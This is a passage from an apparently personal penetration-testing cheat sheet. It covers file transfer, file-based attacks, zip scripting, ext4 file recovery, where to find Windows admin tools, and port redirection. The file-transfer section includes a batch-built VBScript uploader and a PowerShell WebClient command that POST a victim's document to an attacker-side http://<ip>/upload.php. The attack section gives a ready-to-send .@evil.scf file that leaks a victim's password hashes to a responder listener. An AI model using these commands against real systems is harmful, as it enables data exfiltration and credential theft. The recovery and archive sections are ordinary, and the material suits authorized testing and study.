<span class="nb">echo</span> <span class="kd">Const</span> <span class="kd">HTTPREQUEST_PROXYSETTING_DIRECT</span> <span class="o">=</span> <span class="m">1</span> <span class="o">&gt;&gt;</span> <span class="kd">upload</span>.vbs
<span class="nb">echo</span> <span class="kd">Const</span> <span class="kd">HTTPREQUEST_PROXYSETTING_PROXY</span> <span class="o">=</span> <span class="m">2</span> <span class="o">&gt;&gt;</span> <span class="kd">upload</span>.vbs
<span class="nb">echo</span> <span class="kd">Dim</span> <span class="kd">http</span><span class="o">,</span> <span class="kd">fs</span><span class="o">,</span> <span class="kd">of</span> <span class="o">&gt;&gt;</span> <span class="kd">upload</span>.vbs
<span class="nb">echo</span> <span class="kd">Err</span>.Clear <span class="o">&gt;&gt;</span> <span class="kd">upload</span>.vbs
<span class="nb">echo</span> <span class="kd">Set</span> <span class="kd">http</span> <span class="o">=</span> <span class="kd">Nothing</span> <span class="o">&gt;&gt;</span> <span class="kd">upload</span>.vbs
<span class="nb">echo</span> <span class="kd">Set</span> <span class="kd">http</span> <span class="o">=</span> <span class="kd">WScript</span>.CreateObject<span class="o">(</span><span class="s2">"Microsoft.XMLHTTP"</span><span class="o">)</span> <span class="o">&gt;&gt;</span> <span class="kd">upload</span>.vbs
<span class="nb">echo</span> <span class="kd">If</span> <span class="kd">http</span> <span class="kd">Is</span> <span class="kd">Nothing</span> <span class="kd">Then</span> <span class="kd">Set</span> <span class="kd">http</span> <span class="o">=</span> <span class="kd">WScript</span>.CreateObject<span class="o">(</span><span class="s2">"WinHttp.WinHttpRequest"</span><span class="o">)</span> <span class="o">&gt;&gt;</span> <span class="kd">upload</span>.vbs
<span class="nb">echo</span> <span class="kd">If</span> <span class="kd">http</span> <span class="kd">Is</span> <span class="kd">Nothing</span> <span class="kd">Then</span> <span class="kd">Set</span> <span class="kd">http</span> <span class="o">=</span> <span class="kd">WScript</span>.CreateObject<span class="o">(</span><span class="s2">"MSXML2.ServerXMLHTTP"</span><span class="o">)</span> <span class="o">&gt;&gt;</span> <span class="kd">upload</span>.vbs
<span class="nb">echo</span> <span class="kd">If</span> <span class="kd">http</span> <span class="kd">Is</span> <span class="kd">Nothing</span> <span class="kd">Then</span> <span class="kd">Set</span> <span class="kd">http</span> <span class="o">=</span> <span class="kd">WScript</span>.CreateObject<span class="o">(</span><span class="s2">"Microsoft.XMLHTTP"</span><span class="o">)</span> <span class="o">&gt;&gt;</span> <span class="kd">upload</span>.vbs
<span class="nb">echo</span> <span class="kd">WScript</span>.Echo <span class="s2">"Uploading "</span> <span class="o">&amp;</span> <span class="kd">strFile</span> <span class="o">&gt;&gt;</span> <span class="kd">upload</span>.vbs
<span class="nb">echo</span> <span class="kd">Set</span> <span class="kd">fs</span> <span class="o">=</span> <span class="kd">WScript</span>.CreateObject<span class="o">(</span><span class="s2">"Scripting.FileSystemObject"</span><span class="o">)</span> <span class="o">&gt;&gt;</span> <span class="kd">upload</span>.vbs
<span class="nb">echo</span> <span class="kd">Set</span> <span class="kd">of</span> <span class="o">=</span> <span class="kd">fs</span>.GetFile<span class="o">(</span><span class="kd">strFile</span><span class="o">)</span> <span class="o">&gt;&gt;</span> <span class="kd">upload</span>.vbs
<span class="nb">echo</span> <span class="kd">With</span> <span class="kd">of</span>.OpenAsTextStream<span class="o">()</span> <span class="o">&gt;&gt;</span> <span class="kd">upload</span>.vbs
<span class="nb">echo</span> <span class="kd">dataFile</span> <span class="o">=</span> .Read<span class="o">(</span><span class="kd">of</span>.Size<span class="o">)</span> <span class="o">&gt;&gt;</span> <span class="kd">upload</span>.vbs
<span class="nb">echo</span> .Close <span class="o">&gt;&gt;</span> <span class="kd">upload</span>.vbs
<span class="nb">echo</span> <span class="kd">End</span> <span class="kd">With</span> <span class="o">&gt;&gt;</span> <span class="kd">upload</span>.vbs
<span class="nb">echo</span> <span class="kd">dataRequest</span> <span class="o">=</span> <span class="kd">dataFile</span> <span class="o">&gt;&gt;</span> <span class="kd">upload</span>.vbs
<span class="nb">echo</span> <span class="kd">http</span>.open <span class="s2">"POST"</span><span class="o">,</span> <span class="kd">strURL</span><span class="o">,</span> <span class="kd">False</span> <span class="o">&gt;&gt;</span> <span class="kd">upload</span>.vbs
<span class="nb">echo</span> <span class="kd">http</span>.setRequestHeader <span class="s2">"Content-Type"</span><span class="o">,</span> <span class="s2">"application/x-www-form-urlencoded"</span> <span class="o">&gt;&gt;</span> <span class="kd">upload</span>.vbs
<span class="nb">echo</span> <span class="kd">http</span>.setRequestHeader <span class="s2">"Content-Length"</span><span class="o">,</span> <span class="kd">Len</span><span class="o">(</span><span class="kd">dataRequest</span><span class="o">)</span> <span class="o">&gt;&gt;</span> <span class="kd">upload</span>.vbs
<span class="nb">echo</span> <span class="kd">http</span>.send <span class="kd">dataRequest</span> <span class="o">&gt;&gt;</span> <span class="kd">upload</span>.vbs
<span class="nb">echo</span> <span class="kd">WScript</span>.Echo <span class="s2">"Done"</span> <span class="o">&gt;&gt;</span> <span class="kd">upload</span>.vbs
<span class="nb">echo</span> <span class="kd">Set</span> <span class="kd">http</span> <span class="o">=</span> <span class="kd">Nothing</span> <span class="o">&gt;&gt;</span> <span class="kd">upload</span>.vbs</code></pre></div></div></li> </ul> <h5 id="file--transfer--windows--upload--powershell"> <a href="#file--transfer--windows--upload--powershell" class="anchor-heading" aria-labelledby="file--transfer--windows--upload--powershell"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> PowerShell </h5> <ul> <li>Using <code>System.Net.WebClient</code> to perform an HTTP POST:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">powershell</span> <span class="o">(</span><span class="kd">New</span><span class="na">-Object </span><span class="kd">System</span>.Net.WebClient<span class="o">)</span>.UploadFile<span class="o">(</span><span class="s1">'http://&lt;ip&gt;/upload.php'</span><span class="o">,</span> <span class="s1">'&lt;file&gt;.docx'</span><span class="o">)</span></code></pre></div></div></li> </ul> <h3 id="file--transfer--linux"> <a href="#file--transfer--linux" class="anchor-heading" aria-labelledby="file--transfer--linux"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Linux </h3> <h4 id="file--transfer--linux--perl-file--fetch"> <a href="#file--transfer--linux--perl-file--fetch" class="anchor-heading" aria-labelledby="file--transfer--linux--perl-file--fetch"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Perl File::Fetch </h4> <ul> <li>HTTP only (and file, FTP, rsync &amp; git):<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Might not support redirects (iosock)</span>
perl <span class="nt">-mFile</span>::Fetch <span class="nt">-le</span> <span class="s1">'File::Fetch-&gt;new(uri=&gt;"&lt;url&gt;")-&gt;fetch(to=&gt;\$_) or die;print'</span>
<span class="c"># For FTP some changes may be required</span></code></pre></div></div></li> </ul> <h2 id="file--attack"> <a href="#file--attack" class="anchor-heading" aria-labelledby="file--attack"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Attack </h2> <h3 id="file--attack--windows"> <a href="#file--attack--windows" class="anchor-heading" aria-labelledby="file--attack--windows"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Windows </h3> <h4 id="file--attack--windows--scf-file-attack"> <a href="#file--attack--windows--scf-file-attack" class="anchor-heading" aria-labelledby="file--attack--windows--scf-file-attack"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> SCF File Attack </h4> <ul> <li>Shell Command Files (<code>.scf</code>) can be used to send a victim&#8217;s hashes to an attacker listening with <code>responder</code></li> <li>Send <code>.@evil.scf</code> to the victim:<div class="language-conf highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[<span class="n">Shell</span>]
<span class="n">Command</span>=<span class="m">2</span>
<span class="n">IconFile</span>=\\&lt;<span class="n">ip</span>&gt;\<span class="n">share</span>\<span class="n">test</span>.<span class="n">ico</span>
[<span class="n">Taskbar</span>]
<span class="n">Command</span>=<span class="n">ToggleDesktop</span></code></pre></div></div></li> <li>The <code>.@</code> symbols are used to hide it and give it top execution priority</li> <li>When the victim access the folder with the <code>.scf</code> file, the attacker will receive a connection with the hashes</li> </ul> <h2 id="file--compression---archive"> <a href="#file--compression---archive" class="anchor-heading" aria-labelledby="file--compression---archive"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Compression / Archive </h2> <h3 id="file--compression---archive--windows"> <a href="#file--compression---archive--windows" class="anchor-heading" aria-labelledby="file--compression---archive--windows"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Windows </h3> <h4 id="file--compression---archive--windows--troubleshooting"> <a href="#file--compression---archive--windows--troubleshooting" class="anchor-heading" aria-labelledby="file--compression---archive--windows--troubleshooting"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Troubleshooting </h4> <ul> <li>Some Windows versions and user accounts (such as Administrator) may behave unreliably due to the <code>CopyHere</code> function</li> <li>Remove the <code>//B</code> parameter to see the error</li> <li><code>CopyHere</code> codes vary: <a href="https://web.archive.org/web/20101219122453/http://msdn.microsoft.com/en-us/library/bb787866(VS.85).aspx">older</a> - <a href="https://docs.microsoft.com/en-us/windows/win32/shell/folder-copyhere">old</a> - <a href="https://docs.microsoft.com/en-us/previous-versions/windows/desktop/sidebar/system-shell-folder-copyhere?redirectedfrom=MSDN">new</a></li> <li>Try using as last parameter 4 (no copy dialog), 16 (answer yes to all), 1024 (no dialog if error) or False</li> <li>Note that using nothing (or 0) may hang the script as it prompts something in the UI and waits for the user interaction</li> <li>Also try appending a trailing backslash to the directory (and zip) path</li> <li>Ultimately try with a non-SYSTEM shell</li> </ul> <h4 id="file--compression---archive--windows--unzip"> <a href="#file--compression---archive--windows--unzip" class="anchor-heading" aria-labelledby="file--compression---archive--windows--unzip"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Unzip </h4> <ul> <li>VBScript to be run with <code>cscript //B //T:180 //Nologo unzip.vbs &quot;&lt;orig.zip&gt;&quot; &quot;&lt;dest-dir&gt;&quot;</code>, inspired by <a href="https://superuser.com/a/1314429">this</a>:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="kd">Dim</span> <span class="kd">fso</span><span class="o">,</span> <span class="kd">strZip</span><span class="o">,</span> <span class="kd">strDir</span><span class="o">,</span> <span class="kd">objShell</span><span class="o">,</span> <span class="kd">filesInZip</span> <span class="o">&gt;</span> <span class="kd">unzip</span>.vbs
<span class="nb">echo</span> <span class="kd">Set</span> <span class="kd">fso</span> <span class="o">=</span> <span class="kd">WScript</span>.CreateObject<span class="o">(</span><span class="s2">"Scripting.FileSystemObject"</span><span class="o">)</span> <span class="o">&gt;&gt;</span> <span class="kd">unzip</span>.vbs
<span class="nb">echo</span> <span class="kd">strZip</span> <span class="o">=</span> <span class="kd">fso</span>.GetAbsolutePathName<span class="o">(</span><span class="kd">WScript</span>.Arguments.Item<span class="o">(</span><span class="m">0</span><span class="o">))</span> <span class="o">&gt;&gt;</span> <span class="kd">unzip</span>.vbs
<span class="nb">echo</span> <span class="kd">strDir</span> <span class="o">=</span> <span class="kd">fso</span>.GetAbsolutePathName<span class="o">(</span><span class="kd">WScript</span>.Arguments.Item<span class="o">(</span><span class="m">1</span><span class="o">))</span> <span class="o">&gt;&gt;</span> <span class="kd">unzip</span>.vbs
<span class="nb">echo</span> <span class="kd">WScript</span>.Echo <span class="s2">"Unzipping "</span> <span class="se">^&amp;</span> <span class="kd">strZip</span> <span class="se">^&amp;</span> <span class="s2">" into "</span> <span class="se">^&amp;</span> <span class="kd">strDir</span> <span class="o">&gt;&gt;</span> <span class="kd">unzip</span>.vbs
<span class="nb">echo</span> <span class="kd">If</span> <span class="kd">NOT</span> <span class="kd">fso</span>.FolderExists<span class="o">(</span><span class="kd">strDir</span><span class="o">)</span> <span class="kd">Then</span> <span class="o">&gt;&gt;</span> <span class="kd">unzip</span>.vbs
<span class="nb">echo</span> <span class="kd">fso</span>.CreateFolder<span class="o">(</span><span class="kd">strDir</span><span class="o">)</span> <span class="o">&gt;&gt;</span> <span class="kd">unzip</span>.vbs
<span class="nb">echo</span> <span class="kd">End</span> <span class="kd">If</span> <span class="o">&gt;&gt;</span> <span class="kd">unzip</span>.vbs
<span class="nb">echo</span> <span class="kd">Set</span> <span class="kd">fso</span> <span class="o">=</span> <span class="kd">Nothing</span> <span class="o">&gt;&gt;</span> <span class="kd">unzip</span>.vbs
<span class="nb">echo</span> <span class="kd">Set</span> <span class="kd">objShell</span> <span class="o">=</span> <span class="kd">WScript</span>.CreateObject<span class="o">(</span><span class="s2">"Shell.Application"</span><span class="o">)</span> <span class="o">&gt;&gt;</span> <span class="kd">unzip</span>.vbs
<span class="nb">echo</span> <span class="kd">Set</span> <span class="kd">filesInZip</span> <span class="o">=</span> <span class="kd">objShell</span>.NameSpace<span class="o">(</span><span class="kd">strZip</span><span class="o">)</span>.Items <span class="o">&gt;&gt;</span> <span class="kd">unzip</span>.vbs
<span class="nb">echo</span> <span class="kd">objShell</span>.NameSpace<span class="o">(</span><span class="kd">strDir</span><span class="o">)</span>.CopyHere<span class="o">(</span><span class="kd">filesInZip</span><span class="o">),</span> <span class="m">4</span> <span class="o">+</span> <span class="m">16</span> <span class="o">+</span> <span class="m">1024</span> <span class="o">&gt;&gt;</span> <span class="kd">unzip</span>.vbs
<span class="nb">echo</span> <span class="kd">Set</span> <span class="kd">objShell</span> <span class="o">=</span> <span class="kd">Nothing</span> <span class="o">&gt;&gt;</span> <span class="kd">unzip</span>.vbs</code></pre></div></div></li> </ul> <h4 id="file--compression---archive--windows--zip"> <a href="#file--compression---archive--windows--zip" class="anchor-heading" aria-labelledby="file--compression---archive--windows--zip"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Zip </h4> <ul> <li>VBScript to be run with <code>cscript //B //T:180 //Nologo zip.vbs &quot;&lt;dest.zip&gt;&quot; &quot;&lt;orig-dir&gt;&quot;</code>, inspired by <a href="https://www.robvanderwoude.com/vbstech_files_zip.php">this</a>:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="kd">Dim</span> <span class="kd">fso</span><span class="o">,</span> <span class="kd">strZip</span><span class="o">,</span> <span class="kd">strDir</span><span class="o">,</span> <span class="kd">objShell</span><span class="o">,</span> <span class="kd">intSrcItems</span><span class="o">,</span> <span class="kd">intSkipped</span><span class="o">,</span> <span class="kd">filesInDir</span> <span class="o">&gt;</span> <span class="kd">zip</span>.vbs
<span class="nb">echo</span> <span class="kd">Set</span> <span class="kd">fso</span> <span class="o">=</span> <span class="kd">WScript</span>.CreateObject<span class="o">(</span><span class="s2">"Scripting.FileSystemObject"</span><span class="o">)</span> <span class="o">&gt;&gt;</span> <span class="kd">zip</span>.vbs
<span class="nb">echo</span> <span class="kd">strZip</span> <span class="o">=</span> <span class="kd">fso</span>.GetAbsolutePathName<span class="o">(</span><span class="kd">WScript</span>.Arguments.Item<span class="o">(</span><span class="m">0</span><span class="o">))</span> <span class="o">&gt;&gt;</span> <span class="kd">zip</span>.vbs
<span class="nb">echo</span> <span class="kd">strDir</span> <span class="o">=</span> <span class="kd">fso</span>.GetAbsolutePathName<span class="o">(</span><span class="kd">WScript</span>.Arguments.Item<span class="o">(</span><span class="m">1</span><span class="o">))</span> <span class="o">&gt;&gt;</span> <span class="kd">zip</span>.vbs
<span class="nb">echo</span> <span class="kd">WScript</span>.Echo <span class="s2">"Zipping "</span> <span class="se">^&amp;</span> <span class="kd">strDir</span> <span class="se">^&amp;</span> <span class="s2">" into "</span> <span class="se">^&amp;</span> <span class="kd">strZip</span> <span class="o">&gt;&gt;</span> <span class="kd">zip</span>.vbs
<span class="nb">echo</span> <span class="kd">With</span> <span class="kd">fso</span>.OpenTextFile<span class="o">(</span><span class="kd">strZip</span><span class="o">,</span> <span class="m">2</span><span class="o">,</span> <span class="kd">True</span><span class="o">)</span> <span class="o">&gt;&gt;</span> <span class="kd">zip</span>.vbs
<span class="nb">echo</span> .Write <span class="s2">"PK"</span> <span class="se">^&amp;</span> <span class="kd">Chr</span><span class="o">(</span><span class="m">5</span><span class="o">)</span> <span class="se">^&amp;</span> <span class="kd">Chr</span><span class="o">(</span><span class="m">6</span><span class="o">)</span> <span class="se">^&amp;</span> <span class="kd">String</span><span class="o">(</span><span class="m">18</span><span class="o">,</span> <span class="kd">Chr</span><span class="o">(</span><span class="m">0</span><span class="o">))</span> <span class="o">&gt;&gt;</span> <span class="kd">zip</span>.vbs
<span class="nb">echo</span> .Close <span class="o">&gt;&gt;</span> <span class="kd">zip</span>.vbs
<span class="nb">echo</span> <span class="kd">End</span> <span class="kd">With</span> <span class="o">&gt;&gt;</span> <span class="kd">zip</span>.vbs
<span class="nb">echo</span> <span class="kd">Set</span> <span class="kd">objShell</span> <span class="o">=</span> <span class="kd">WScript</span>.CreateObject<span class="o">(</span><span class="s2">"Shell.Application"</span><span class="o">)</span> <span class="o">&gt;&gt;</span> <span class="kd">zip</span>.vbs
<span class="nb">echo</span> <span class="kd">Set</span> <span class="kd">filesInDir</span> <span class="o">=</span> <span class="kd">objShell</span>.NameSpace<span class="o">(</span><span class="kd">strDir</span><span class="o">)</span>.Items <span class="o">&gt;&gt;</span> <span class="kd">zip</span>.vbs
<span class="nb">echo</span> <span class="kd">intSkipped</span> <span class="o">=</span> <span class="m">0</span> <span class="o">&gt;&gt;</span> <span class="kd">zip</span>.vbs
<span class="nb">echo</span> <span class="kd">For</span> <span class="kd">Each</span> <span class="kd">objItem</span> <span class="k">in</span> <span class="kd">filesInDir</span> <span class="o">&gt;&gt;</span> <span class="kd">zip</span>.vbs
<span class="nb">echo</span> <span class="kd">If</span> <span class="kd">objItem</span>.IsFolder <span class="kd">Then</span> <span class="o">&gt;&gt;</span> <span class="kd">zip</span>.vbs
<span class="nb">echo</span> <span class="kd">If</span> <span class="kd">objShell</span>.NameSpace<span class="o">(</span><span class="kd">objItem</span>.Path<span class="o">)</span>.Items.Count <span class="o">=</span> <span class="m">0</span> <span class="kd">Then</span> <span class="o">&gt;&gt;</span> <span class="kd">zip</span>.vbs
<span class="nb">echo</span> <span class="kd">intSkipped</span> <span class="o">=</span> <span class="kd">intSkipped</span> <span class="o">+</span> <span class="m">1</span> <span class="o">&gt;&gt;</span> <span class="kd">zip</span>.vbs
<span class="nb">echo</span> <span class="kd">End</span> <span class="kd">If</span> <span class="o">&gt;&gt;</span> <span class="kd">zip</span>.vbs
<span class="nb">echo</span> <span class="kd">End</span> <span class="kd">If</span> <span class="o">&gt;&gt;</span> <span class="kd">zip</span>.vbs
<span class="nb">echo</span> <span class="kd">Next</span> <span class="o">&gt;&gt;</span> <span class="kd">zip</span>.vbs
<span class="nb">echo</span> <span class="kd">objShell</span>.NameSpace<span class="o">(</span><span class="kd">strZip</span><span class="o">)</span>.CopyHere<span class="o">(</span><span class="kd">filesInDir</span><span class="o">),</span> <span class="m">4</span> <span class="o">+</span> <span class="m">16</span> <span class="o">+</span> <span class="m">1024</span> <span class="o">&gt;&gt;</span> <span class="kd">zip</span>.vbs
<span class="nb">echo</span> <span class="kd">intSrcItems</span> <span class="o">=</span> <span class="kd">filesInDir</span>.Count <span class="o">-</span> <span class="kd">intSkipped</span> <span class="o">&gt;&gt;</span> <span class="kd">zip</span>.vbs
<span class="nb">echo</span> <span class="kd">Set</span> <span class="kd">filesInDir</span> <span class="o">=</span> <span class="kd">Nothing</span> <span class="o">&gt;&gt;</span> <span class="kd">zip</span>.vbs
<span class="nb">echo</span> <span class="kd">Do</span> <span class="kd">Until</span> <span class="kd">objShell</span>.NameSpace<span class="o">(</span><span class="kd">strZip</span><span class="o">)</span>.Items.Count <span class="o">=</span> <span class="kd">intSrcItems</span> <span class="o">&gt;&gt;</span> <span class="kd">zip</span>.vbs
<span class="nb">echo</span> <span class="kd">WScript</span>.sleep <span class="m">200</span> <span class="o">&gt;&gt;</span> <span class="kd">zip</span>.vbs
<span class="nb">echo</span> <span class="kd">Loop</span> <span class="o">&gt;&gt;</span> <span class="kd">zip</span>.vbs
<span class="nb">echo</span> <span class="kd">Set</span> <span class="kd">objShell</span> <span class="o">=</span> <span class="kd">Nothing</span> <span class="o">&gt;&gt;</span> <span class="kd">zip</span>.vbs
<span class="nb">echo</span> <span class="kd">Set</span> <span class="kd">fso</span> <span class="o">=</span> <span class="kd">Nothing</span> <span class="o">&gt;&gt;</span> <span class="kd">zip</span>.vbs</code></pre></div></div></li> </ul> <h2 id="file--recovery"> <a href="#file--recovery" class="anchor-heading" aria-labelledby="file--recovery"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Recovery </h2> <h3 id="file--recovery--ext4"> <a href="#file--recovery--ext4" class="anchor-heading" aria-labelledby="file--recovery--ext4"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Ext4 </h3> <h4 id="file--recovery--ext4--ext4magic"> <a href="#file--recovery--ext4--ext4magic" class="anchor-heading" aria-labelledby="file--recovery--ext4--ext4magic"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> ext4magic </h4> <ul> <li><a href="ext4magic.sourceforge.net">Site</a> - Recover deleted files (<a href="https://gist.github.com/ebautistabar/cca12863e6335d08a019f015f53fac4a">ref</a>)</li> <li>Dump the journal (optional):<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Recommended to avoid overriding</span>
debugfs <span class="nt">-R</span> <span class="s2">"dump &lt;8&gt; &lt;sdnN&gt;.jnl"</span> /dev/&lt;sdnN&gt;</code></pre></div></div></li> <li>Unmount partition:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>umount /dev/&lt;sdnN&gt;</code></pre></div></div></li> <li>List deleted files in last 6 hours:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Remove -j &lt;jnl&gt; if no journal dump</span>
ext4magic /dev/&lt;sdnN&gt; <span class="nt">-a</span> <span class="si">$(</span><span class="nb">date</span> <span class="nt">-d</span> <span class="s2">"-6hours"</span> +%s<span class="si">)</span> <span class="nt">-f</span> &lt;inspect/folder&gt; <span class="nt">-j</span> &lt;sdnN&gt;.jnl <span class="nt">-l</span>
<span class="c"># -f is the path from &lt;sdnN&gt; root</span></code></pre></div></div></li> <li>Recover deleted files in last 6 hours:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ext4magic /dev/&lt;sdnN&gt; <span class="nt">-a</span> <span class="si">$(</span><span class="nb">date</span> <span class="nt">-d</span> <span class="s2">"-6hours"</span> +%s<span class="si">)</span> <span class="nt">-f</span> &lt;inspect/folder&gt; <span class="nt">-j</span> &lt;sdnN&gt;.jnl <span class="nt">-r</span> <span class="nt">-d</span> &lt;dir-to-save&gt;
<span class="c"># Use -m instead of -r for &lt; 100%</span></code></pre></div></div></li> </ul> <h3 id="file--recovery---ds_store"> <a href="#file--recovery---ds_store" class="anchor-heading" aria-labelledby="file--recovery---ds_store"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> .DS_Store </h3> <h4 id="file--recovery---ds_store--python-dsstore"> <a href="#file--recovery---ds_store--python-dsstore" class="anchor-heading" aria-labelledby="file--recovery---ds_store--python-dsstore"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Python-dsstore </h4> <ul> <li><a href="https://github.com/gehaxelt/Python-dsstore">Site</a> - Parse .DS_Store cache content:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 main.py .DS_Store | <span class="nb">awk</span> <span class="s1">'!x[$0]++'</span>
<span class="c"># Removes duplicates</span></code></pre></div></div></li> </ul> <h2 id="file--signatures"> <a href="#file--signatures" class="anchor-heading" aria-labelledby="file--signatures"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Signatures </h2> <ul> <li><a href="https://en.wikipedia.org/wiki/List_of_file_signatures">List of file signatures</a></li> </ul> <h1 id="location-common-tools"> <a href="#location-common-tools" class="anchor-heading" aria-labelledby="location-common-tools"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Location Common Tools </h1> <h2 id="location-common-tools--windows"> <a href="#location-common-tools--windows" class="anchor-heading" aria-labelledby="location-common-tools--windows"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Windows </h2> <h3 id="location-common-tools--windows--official-sites"> <a href="#location-common-tools--windows--official-sites" class="anchor-heading" aria-labelledby="location-common-tools--windows--official-sites"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Official sites </h3> <ul> <li>Wayback machine has an entry for <a href="https://web.archive.org/web/20150208045558/http://support.microsoft.com/kb/927229">http://support.microsoft.com/kb/927229</a> which contains many old tools that can be downloaded, including <code>whoami</code>, <code>setx</code>, and <a href="https://www.techsupportforum.com/threads/windows-2000-tasklist-equivalent-command.524240/">pulist</a> (+ others for drivers, etc)</li> <li><a href="https://docs.microsoft.com/en-us/sysinternals/">SysInternals</a> (maybe the original) may contain the rest of the tools (including <code>schtasks</code>)</li> </ul> <h3 id="location-common-tools--windows--plink-exe"> <a href="#location-common-tools--windows--plink-exe" class="anchor-heading" aria-labelledby="location-common-tools--windows--plink-exe"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> PLINK.exe </h3> <ul> <li>Kali - Incompatible: <code>locate plink.exe</code></li> <li>WinXP usable + OpenSSH usable: <a href="https://the.earth.li/~sgtatham/putty/latest/w32old/plink.exe">w32old</a></li> <li>All others (unchecked): <a href="https://the.earth.li/~sgtatham/putty/latest/w32/plink.exe">w32</a> - <a href="https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe">w64</a></li> <li><a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html">Official page</a></li> </ul> <h3 id="location-common-tools--windows--reg-exe-and-other-admin-tools"> <a href="#location-common-tools--windows--reg-exe-and-other-admin-tools" class="anchor-heading" aria-labelledby="location-common-tools--windows--reg-exe-and-other-admin-tools"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> REG.exe and other admin tools </h3> <ul> <li><a href="https://www.saule-spb.ru/touch/windows_files.html">saule-spb.ru</a></li> </ul> <h2 id="location-common-tools--linux"> <a href="#location-common-tools--linux" class="anchor-heading" aria-labelledby="location-common-tools--linux"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Linux </h2> <h3 id="location-common-tools--linux--static-get"> <a href="#location-common-tools--linux--static-get" class="anchor-heading" aria-labelledby="location-common-tools--linux--static-get"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> static-get </h3> <ul> <li><a href="https://github.com/minos-org/minos-static/blob/master/static-get">Script</a> - <a href="http://s.minos.io/">s.minos.io</a> static builds:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Search</span>
static-get <span class="nt">-s</span> &lt;search-pkg&gt;
<span class="c"># Use the &lt;pkg.tar.xz&gt; below</span>

<span class="c"># Download</span>
static-get &lt;pkg-from-search-results&gt;
<span class="c"># -o &lt;dir&gt; - Set download directory</span></code></pre></div></div></li> </ul> <h1 id="port-redirection"> <a href="#port-redirection" class="anchor-heading" aria-labelledby="port-redirection"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Port Redirection </h1> <h2 id="port-redirection--scanner-configuration---fix"> <a href="#port-redirection--scanner-configuration---fix" class="anchor-heading" aria-labelledby="port-redirection--scanner-configuration---fix"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Scanner Configuration / Fix </h2> <h3 id="port-redirection--scanner-configuration---fix--nmap"> <a href="#port-redirection--scanner-configuration---fix--nmap" class="anchor-heading" aria-labelledby="port-redirection--scanner-configuration---fix--nmap"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Nmap </h3> <ul> <li>Use <code>gost</code> to create a SOCKS tunnel + <code>tun2socks</code> to create a TUN and run <code>nmap</code> with <code>-e &lt;tun&gt;</code> (allows UDP + SYN Scan)</li> <li>Alternatively use <code>graftcp</code> or <code>proxychains</code> for TCP CONNECT scan (<code>-sT</code>) only in unprivileged mode (<code>--unprivileged</code>), <a href="https://security.stackexchange.com/a/181111">see</a></li> <li>The builtin alternative is to use the <code>--proxies</code> flag though note it is experimental and limited to SOCKS4 or HTTP proxy only for NSE scripts, or <code>ncat</code> in listen mode with proxy flags to a SOCKS5 (TCP only)</li> </ul> <h2 id="port-redirection--vpn"> <a href="#port-redirection--vpn" class="anchor-heading" aria-labelledby="port-redirection--vpn"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> VPN </h2> <h3 id="port-redirection--vpn--gost"> <a href="#port-redirection--vpn--gost" class="anchor-heading" aria-labelledby="port-redirection--vpn--gost"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Gost </h3> <ul> <li>Get the <a href="https://github.com/ginuerzh/gost/releases/">binaries</a> (or <a href="https://github.com/caribpa/gost/tree/cmd-split">my changes</a>)</li> <li>Supports <a 